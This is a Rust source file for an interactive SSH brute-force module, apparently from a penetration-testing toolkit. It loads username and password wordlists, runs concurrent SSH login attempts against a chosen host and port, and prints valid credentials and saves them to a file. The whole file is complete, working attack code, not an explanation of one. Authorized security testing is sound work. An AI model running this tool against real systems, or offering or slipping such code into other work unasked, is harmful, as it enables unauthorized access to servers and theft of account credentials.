use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    net::TcpStream,
    path::{Path, PathBuf},
    sync::Arc,
};
use tokio::{
    sync::{Mutex, Semaphore},
    task::spawn_blocking,
    time::{sleep, Duration},
};

pub async fn run(target: &str) -> Result<()> {
    println!("=== SSH Brute Force Module ===");
    println!("[*] Target: {}", target);

    let port: u16 = loop {
        let input = prompt_default("SSH Port", "22")?;
        match input.parse() {
            Ok(p) => break p,
            Err(_) => println!("Invalid port. Try again."),
        }
    };

    let usernames_file = prompt_required("Username wordlist")?;
    let passwords_file = prompt_required("Password wordlist")?;

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10")?;
        match input.parse() {
            Ok(n) if n > 0 => break n,
            _ => println!("Invalid number. Try again."),
        }
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "ssh_brute_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false)?;

    let initial_addr = format!("{}:{}", target, port);
    let connect_addr = format_host_port(&initial_addr)?;

    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(Mutex::new(false));

    println!("\n[*] Starting brute-force on {}", connect_addr);

    let users = Arc::new(load_lines(&usernames_file)?);
    let pass_file = File::open(&passwords_file)?;
    let pass_buf = BufReader::new(pass_file);
    let pass_lines: Vec<_> = pass_buf.lines().filter_map(Result::ok).collect();

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks = Vec::new();
    let mut user_cycle_idx = 0;

    for pass_str in pass_lines {
        if *stop.lock().await {
            break;
        }

        let users_for_current_pass: Box<dyn Iterator<Item = String>> = if combo_mode {
            Box::new(users.iter().cloned())
        } else {
            if users.is_empty() {
                Box::new(std::iter::empty())
            } else {
                let user = users[user_cycle_idx % users.len()].clone();
                user_cycle_idx += 1;
                Box::new(std::iter::once(user))
            }
        };

        for user_str in users_for_current_pass {
            if *stop.lock().await {
                break;
            }

            let permit = Arc::clone(&semaphore).acquire_owned().await?;
            
            let task_addr = connect_addr.clone();
            let task_user = user_str;
            let task_pass = pass_str.clone();
            let found_clone = Arc::clone(&found);
            let stop_clone = Arc::clone(&stop);

            let task = tokio::spawn(async move {
                let _permit = permit;

                if *stop_clone.lock().await {
                    return;
                }

                match try_ssh_login(&task_addr, &task_user, &task_pass).await {
                    Ok(true) => {
                        println!("[+] {} -> {}:{}", task_addr, task_user, task_pass);
                        found_clone.lock().await.push((task_addr.clone(), task_user.clone(), task_pass.clone()));
                        if stop_on_success {
                            *stop_clone.lock().await = true;
                        }
                    }
                    Ok(false) => {
                        log(verbose, &format!("[-] {} -> {}:{}", task_addr, task_user, task_pass));
                    }
                    Err(e) => {
                        log(verbose, &format!("[!] {}: error: {}", task_addr, e));
                    }
                }
                sleep(Duration::from_millis(10)).await;
            });
            tasks.push(task);
        }
    }

    for task in tasks {
        let _ = task.await;
    }

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n[-] No credentials found.");
    } else {
        println!("\n[+] Valid credentials:");
        for (host, user, pass) in creds.iter() {
            println!("     {} -> {}:{}", host, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            let mut file = File::create(&filename)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            println!("[+] Results saved to '{}'", filename.display());
        }
    }

    Ok(())
}

async fn try_ssh_login(normalized_addr: &str, user: &str, pass: &str) -> Result<bool> {
    let user_owned = user.to_string();
    let pass_owned = pass.to_string();
    let addr_owned = normalized_addr.to_string();

    let result = spawn_blocking(move || {
        match TcpStream::connect(&addr_owned) {
            Ok(tcp) => {
                let mut sess = Session::new()?;
                sess.set_tcp_stream(tcp);
                sess.handshake()?;
                match sess.userauth_password(&user_owned, &pass_owned) {
                    Ok(_) => Ok(sess.authenticated()),
                    Err(_) => Ok(false),
                }
            }
            Err(e) => Err(anyhow!("Connection error to {}: {}", addr_owned, e)),
        }
    })
    .await??;

    Ok(result)
}

fn format_host_port(input: &str) -> Result<String> {
    if input.starts_with('[') {
        if let Some(end_bracket_idx) = input.find("]:") {
            let host_part = &input[1..end_bracket_idx];
            if !host_part.contains('[') && !host_part.contains(']') {
                if (&input[end_bracket_idx+2..]).parse::<u16>().is_ok() {
                     return Ok(input.to_string());
                }
            }
        }
    }

    let (host_candidate, port_str) = match input.rfind(':') {
        Some(idx) if idx > 0 => { // Ensure colon is not the first character
            let (h, p) = input.split_at(idx);
            (h, &p[1..]) // Strip colon from port part
        }
        _ => return Err(anyhow!("Invalid target address format: '{}' - missing port or malformed", input)),
    };
    
    if port_str.parse::<u16>().is_err() {
        return Err(anyhow!("Invalid port in address: '{}'", input));
    }

    let stripped_host = host_candidate.trim_matches(|c| c == '[' || c == ']');

    if stripped_host.contains(':') {
        Ok(format!("[{}]:{}", stripped_host, port_str))
    } else {
        Ok(format!("{}:{}", stripped_host, port_str))
    }
}

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}", format!("{}: ", msg).cyan().bold());
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        } else {
            println!("{}", "This field is required.".yellow());
        }
    }
}

fn prompt_default(msg: &str, default: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", msg, default).cyan().bold());
    std::io::stdout().flush()?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{}", format!("{} (y/n) [{}]: ", msg, default_char).cyan().bold());
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        if input.is_empty() {
            return Ok(default_yes);
        } else if input == "y" || input == "yes" {
            return Ok(true);
        } else if input == "n" || input == "no" {
            return Ok(false);
        } else {
            println!("{}", "Invalid input. Please enter 'y' or 'n'.".yellow());
        }
    }
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path.as_ref())
        .map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .filter(|l| !l.trim().is_empty())
        .collect())
}

fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

fn get_filename_in_current_dir(input_path_str: &str) -> PathBuf {
    let path_candidate = Path::new(input_path_str)
        .file_name()
        .map(|os_str| os_str.to_string_lossy())
        .filter(|s_cow| !s_cow.is_empty() && s_cow != "." && s_cow != "..")
        .map(|s_cow| s_cow.into_owned())
        .unwrap_or_else(|| "ssh_brute_results.txt".to_string());
    
    PathBuf::from(format!("./{}", path_candidate))
}
